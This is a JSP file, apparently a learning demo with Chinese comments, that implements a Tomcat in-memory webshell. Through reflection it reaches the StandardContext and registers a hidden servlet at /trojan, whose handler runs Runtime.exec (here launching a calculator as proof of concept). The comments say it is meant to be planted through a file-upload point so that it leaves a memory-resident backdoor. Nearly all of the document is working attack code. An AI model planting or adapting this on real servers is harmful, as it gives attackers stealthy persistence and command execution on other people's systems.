<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %><%--
  Created by IntelliJ IDEA.
  User: hasee
  Date: 2023/5/4
  Time: 16:38
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%!
  @WebServlet(urlPatterns = "/trojan")
  public class MemoryTrojanServlet extends HttpServlet {
    private String message;

    @Override
    public void init() {
      message = "Servlet Range!";
    }

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
      Runtime.getRuntime().exec("calc");
    }
  }
%>
<%
  // 动态注册 Servlet （前提，有一个文件上传点，这个 servlet.jsp 文件就是小马，访问后就会生成内存马）
  // 1. 获取 StandardContext
  ServletContext servletContext = request.getServletContext();
  // ServletContext 中有 ApplicationContext，ApplicationContext 中又有 StandardContext。通过反射获取到 ApplicationContextField。
  Field applicationContextField = servletContext.getClass().getDeclaredField("context");
  applicationContextField.setAccessible(true);
  // 通过反射拿到 servletContext 具体的 ApplicationContext
  ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
  // 重复上述过程，从具体的 ApplicationContext 中拿到具体的 StandardContext
  Field standardContextField = applicationContext.getClass().getDeclaredField("context");
  standardContextField.setAccessible(true);
  StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
  // 2. 将该 Servlet 注册到 Context 当中（过程和 StandardContext 注册 Servlet 一样）
  Wrapper wrapper = standardContext.createWrapper();
  wrapper.setName("MemoryTrojanServlet");
  wrapper.setServletClass(MemoryTrojanServlet.class.getName());
  // 这里需要补充一个 Servlet 的实例化，因为 Servlet 默认是懒加载的
  wrapper.setServlet(new MemoryTrojanServlet());
  standardContext.addChild(wrapper);
  // 这里就相当于写木马了，访问 /servlet 后，就会调用 MemoryTrojanServlet 的 doGet，从而喜提计算器
  standardContext.addServletMappingDecoded("/trojan", "MemoryTrojanServlet");
%>
</body>
</html>
